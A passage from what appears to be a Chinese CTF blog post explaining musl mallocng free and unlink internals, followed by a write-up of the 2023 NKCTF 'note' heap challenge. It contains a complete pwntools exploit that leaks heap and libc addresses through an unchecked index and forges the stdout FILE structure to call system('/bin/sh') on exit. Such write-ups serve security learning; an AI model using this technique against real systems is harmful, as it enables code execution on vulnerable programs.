对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk(这里malloc 那个循环:for (;;)，</span><br><span class="line"></span><br><span class="line">这里不清楚建议看malloc源码分析那里)</span><br><span class="line"></span><br><span class="line">如果通过循环里，通过meta-&gt;avail_mask 判断当前group 中是否有空闲chunk</span><br><span class="line">有，就直接修改meta-&gt;avail_mask，然后利用enframe(g, idx, n, ctr);// 从对应meta 中的group 取出 第idx号chunk分配</span><br><span class="line">无，break 跳出循环</span><br><span class="line">跳出循环后执行idx = alloc_slot(sc, n); alloc_slot有三种分配方式</span><br><span class="line">使用group中被free的chunk</span><br><span class="line">从队列中其他meta的group 中找</span><br><span class="line">如果都不行就重新分配一个新的group 对应一个新的meta</span><br><span class="line">enframe(g, idx, n, ctr) 取出 对应meta 中对应idx 的chunk</span><br></pre></td></tr></table></figure><p>和glibc不同的是 musl中chunk有三种状态 </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304012247718.png" title="image-20230401224722613" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304012247718.png" alt="image-20230401224722613"></a></p><p>从上面的源码也可以看出 是优先查找空闲的chunk 其次才是被释放的chunk</p><p>所以被释放的chunk不会立刻回收利用</p><p>接下来看一下free函数的源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);<span class="comment">// 通过chunk p 用get_meta得到对应的meta</span></span><br><span class="line">    <span class="type">int</span> idx = get_slot_index(p);<span class="comment">// 得到对应chunk的 idx</span></span><br><span class="line">    <span class="type">size_t</span> stride = get_stride(g); <span class="comment">// 得到sizeclasses 中对应chunk类型的size</span></span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *end = start + stride - IB;</span><br><span class="line">    <span class="comment">//*start = g-&gt;mem-&gt;storage(得到group中第一个chunk地址) + stride*idx(加上对应chunk偏移);</span></span><br><span class="line">    <span class="comment">// start 就为对应p(chunk)的起始地址</span></span><br><span class="line">    <span class="comment">// end 对应结束地址</span></span><br><span class="line"> </span><br><span class="line">    get_nominal_size(p, end);<span class="comment">//算出真实大小</span></span><br><span class="line">    <span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;<span class="comment">//设置bitmap 标志</span></span><br><span class="line">    ((<span class="type">unsigned</span> <span class="type">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line">    *(<span class="type">uint16_t</span> *)((<span class="type">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (((<span class="type">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="type">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *base = start + (-(<span class="type">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line">        <span class="type">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line">        <span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">        <span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">        <span class="type">uint32_t</span> mask = freed | avail; <span class="comment">// 将释放的chunk 和 现在可用的 chunk 加起来</span></span><br><span class="line">        assert(!(mask&amp;self));</span><br><span class="line">        <span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//!freed 没有被释放的chunk，mask+self==all说明释放了当前chunk所有chunk 都将被回收</span></span><br><span class="line">        <span class="comment">// 此group 会被弹出队列</span></span><br><span class="line">        <span class="keyword">if</span> (!MT)</span><br><span class="line">            g-&gt;freed_mask = freed+self;<span class="comment">// 设置free_mask 表示chunk 被释放</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    wrlock();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);<span class="comment">// 含有meta 操作 ，内有unlink 是漏洞利用的关键</span></span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过get_meta(p)得到meta (get_meta 是通过chunk 对应的offset 索引到对应的group 再索引到meta) 下面会详细介绍get_meta</span><br><span class="line">通过get_slot_index(p)得到对应chunk的 idx -&gt; 通过get_nominal_size(p, end) 算出真实大小</span><br><span class="line">重置idx 和 offset idx 被置为0xff 标记chunk</span><br><span class="line">修改freed_mask 标记chunk被释放</span><br><span class="line">最后调用nontrivial_free 完成关于meta一些剩余操作 (注意进入nontrivial_free 是在for循环外 还未设置)</span><br><span class="line">释放chunk的时候，先只会修改freed_mask,不会修改avail_mask，说明chunk 在释放后，不会立即被复用</span><br><span class="line">注意进入nontrivial_free 是在for循环外 还未设置freed_mask 跳出循环的条件是    if (!freed || mask+self==all) break;</span><br><span class="line">free 中chunk 的起始位置可以通过 chunk的idx 定位</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">    <span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);<span class="comment">// 得到chunk offset</span></span><br><span class="line">    <span class="type">int</span> index = p[<span class="number">-3</span>] &amp; <span class="number">31</span>;;<span class="comment">// 得到chunk idx</span></span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">        assert(!offset);</span><br><span class="line">        offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">        assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);<span class="comment">// 通过offset 和chunk 地址计算出group地址</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;<span class="comment">// 从group 得到 meta 地址</span></span><br><span class="line">    assert(meta-&gt;mem == base);<span class="comment">// 检查meta 是否指向对应的group</span></span><br><span class="line">    assert(index &lt;= meta-&gt;last_idx);<span class="comment">// 检查chunk idx 是否超过 meta 最大chunk 容量</span></span><br><span class="line">    assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);<span class="comment">// 得到meta_area 地址</span></span><br><span class="line">    assert(area-&gt;check == ctx.secret);<span class="comment">// 检查 check 校验值</span></span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123; <span class="comment">// 如果属于 sizeclasses 管理的chunk 大小</span></span><br><span class="line">        assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">        assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">        assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span><span class="comment">// i = idx</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">    <span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">    <span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;<span class="comment">//mask=已经被free的chunk +可使用的chunk</span></span><br><span class="line">    <span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g))</span><br><span class="line">    &#123;    <span class="comment">/*    </span></span><br><span class="line"><span class="comment">         如果 mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 代表此meta中group里的chunk 都被释放 或者 都被用了</span></span><br><span class="line"><span class="comment">         (2u&lt;&lt;g-&gt;last_idx)-1 计算出的值化成二进制，其中每位含义类似于bitmap，如果每位为1表每位要不是被free 不然就是被</span></span><br><span class="line"><span class="comment">         okay_to_free 检测是否可以被释放</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (g-&gt;next)</span><br><span class="line">        &#123;    <span class="comment">// 如果队列中 有下一个meta</span></span><br><span class="line">            assert(sc &lt; <span class="number">48</span>);<span class="comment">// 检测 sc 是不是mmap 分配的</span></span><br><span class="line">      <span class="comment">// 检测当前meta g 和 队列里的active[sc] meta 是否一样，一样则activate_new赋值为1</span></span><br><span class="line">            <span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">            dequeue(&amp;ctx.active[sc], g);<span class="comment">// 当前meta 出队</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment">// 在出队操作后 ,ctx.active[sc]==meta -&gt;next  是指的刚刚出队meta 的下一个meta</span></span><br><span class="line">            <span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">                activate_group(ctx.active[sc]);<span class="comment">//如果有下一个meta 直接激活 然后修改avail_mask 标志位</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> free_group(g);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!mask)</span><br><span class="line">    &#123;<span class="comment">// mask==0 group chunk 空间已被完全使用</span></span><br><span class="line">        assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">        <span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">        <span class="comment">// after last available slot was taken.</span></span><br><span class="line">        <span class="keyword">if</span> (ctx.active[sc] != g) &#123;<span class="comment">// 如果 g 未被加入 队列ctx.ative[sc]</span></span><br><span class="line">            <span class="built_in">queue</span>(&amp;ctx.active[sc], g);<span class="comment">// 把g 加入队列</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a_or(&amp;g-&gt;freed_mask, self);<span class="comment">// 修改对应 的freed_mask 标志 ，表示着对应的chunk 已被释放</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>nontrivial_free函数中调用了一个关键的函数 dequeue</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">        m-&gt;prev-&gt;next = m-&gt;next; <span class="comment">// 这里存在指针互写 在 prev 所指地址上 写入next 指针</span></span><br><span class="line">        m-&gt;next-&gt;prev = m-&gt;prev; <span class="comment">// 在next 所指地址上 写入prev 指针</span></span><br><span class="line">        <span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;<span class="comment">// 队列头如果为m 那就更新为m-&gt;next</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *phead = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;prev = m-&gt;next = <span class="number">0</span>; <span class="comment">// 清理m(meta)的头尾指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其原本的作用是prev和next指针互写 用于一个meta出队时</p><p>meta什么时候会出队 当其所有的chunk都被释放或者都处于空闲状态 就会出队</p><h1 id="2023NKCTF-note"><a href="#2023NKCTF-note" class="headerlink" title="2023NKCTF note"></a>2023NKCTF note</h1><p>说那么多也无聊死了 直接上题目! 先来一题简单的</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304012314117.png" title="image-20230401231443074" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304012314117.png" alt="image-20230401231443074"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304012314622.png" title="image-20230401231455574" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304012314622.png" alt="image-20230401231455574"></a></p><p>代码太长了就不放了 简单介绍一下 给了四个函数</p><p>add 可以申请任意大小的chunk</p><p>edit 同时可以堆溢出</p><p>show 可以打印出chunk的地址</p><p>delete函数 置零了指针 不存在UAF</p><p>但是其对于index并没有检测 所以这个index实际上可以为任意数 我们可以对ptr数组附近的区域进行任意写</p><p>不过 首要的任务还是泄露libc基址  来看看musl的堆题要如何泄露libc基址</p><p>我们先申请一个0xc大小的chunk </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304012321865.png" title="image-20230401232123815" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304012321865.png" alt="image-20230401232123815"></a></p><p>然后再申请一个0x1c大小的chunk</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304021146878.png" title="image-20230402114652687" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304021146878.png" alt="image-20230402114652687"></a></p><p>你会发现第二个chunk竟然分配到的是libc地址上</p><p>这是因为在malloc第二个chunk的时候 如果没有找到合适的空闲chunk或者是被释放的chunk 就会分配一个新的group</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct meta *g = alloc_group(sc, req);</span><br></pre></td></tr></table></figure><p>而分配出来的这个group就位于libc地址上</p><p>相关的可以自己跟着源码动调看看(虽然我自己调了也还是不知道为啥有的分配到了堆地址 有的分配到了libc地址)</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304021204817.png" title="image-20230402120435777" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304021204817.png" alt="image-20230402120435777"></a></p><p>接下来再看题目 这里对于我们输入的v5没有进行任何的限制 也就是说我们可以输出ptr数组后的地址其指向的内容</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304021207961.png" title="image-20230402120710891" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304021207961.png" alt="image-20230402120710891"></a></p><p>此时chunk0和ptr数组相较来说比较接近 所以只要我们将chunk0的内容编辑成chunk1的meta chunk1的meta中有存储着chunk1的地址 这样就能泄露出libc地址了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304021208073.png" title="image-20230402120816031" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304021208073.png" alt="image-20230402120816031"></a></p><p>那么首先就是要泄露出堆地址</p><p>计算一下chunk0和ptr数组的偏移 随后泄露出chunk0的meta地址 计算一下和chunk1的meta的偏移</p><p>随后将chunk1的meta地址存放到chunk0上</p><p>show泄露出libc地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0xc</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1c</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">0x570</span>)</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x2e8</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">chunk1_addr = heap_addr+<span class="number">0x320</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(chunk1_addr))</span><br><span class="line">show(<span class="number">0x572</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-(<span class="number">0x7fccb8f39d10</span>-<span class="number">0x7fccb8e9e000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>接下来难点在于说如何获取shell 在glibc中最常见的做法是覆盖hook函数 但是musl可没有这些东西 所以我们只能采用伪造io_file结构体</p><p>我们来看一下exit函数的调用链</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span></span><br><span class="line">&#123;</span><br><span class="line">    __funcs_on_exit();</span><br><span class="line">    __libc_exit_fini();</span><br><span class="line">    __stdio_exit();</span><br><span class="line">    _Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进一下__stdio_exit函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">    close_file(__stdin_used);</span><br><span class="line">    close_file(__stdout_used);</span><br><span class="line">    close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在最后利用close_file操作了三个file结构体</p><p>我们选择利用__stdout_used 先在gdb中查看一下其构成</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304021314197.png" title="image-20230402131457137" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202304021314197.png" alt="image-20230402131457137"></a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">    FFINALLOCK(f);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当f-&gt;wpos !&#x3D; f-&gt;wbase成立时 就会调用f-&gt;write 并且将f起始的作为rdi寄存器</p><p>也就是说我们需要伪造_stout_file 并且有四个地方需要注意 也就是构造成下面这个样子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_stdout_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x38</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(system)</span><br></pre></td></tr></table></figure><p>并且把可控地址写入到__stdout_used中 这里的可控地址当然是一个chunk了</p><p>不过经过我自己实验 musl中堆的分配好像和glibc不一样 所以这里的chunk必须和chunk1一样是在libc地址中的 这样才能保证偏移正确</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;ctf.comentropy.cn&quot;,8301)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.32.so&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./locate&quot;)</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xc</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1c</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">0x570</span>)</span><br><span class="line">heap_addr = u64(io.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop = <span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x2e8</span></span><br><span class="line">success(<span class="string">&quot;heap_addr :&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">chunk1_addr = heap_addr+<span class="number">0x320</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(chunk1_addr))</span><br><span class="line">show(<span class="number">0x572</span>)</span><br><span class="line">libc_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-(<span class="number">0x7fccb8f39d10</span>-<span class="number">0x7fccb8e9e000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">__stdout_used = libc_addr + libc.sym[<span class="string">&#x27;__stdout_used&#x27;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(system_addr)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x500</span>,fake_file)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(__stdout_used))</span><br><span class="line">fakechunk_addr = libc_addr + (<span class="number">0x7f081beb5020</span>-<span class="number">0x7f081beb6000</span>)</span><br><span class="line">success(<span class="string">&quot;fakechunk_addr :&quot;</span>+<span class="built_in">hex</span>(fakechunk_addr))</span><br><span class="line">edit(<span class="number">0x572</span>,<span class="number">8</span>,p64(fakechunk_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;your choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> extra </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>延迟绑定及利用</title>
      <link href="/2023/03/28/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
      <url>/2023/03/28/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
      
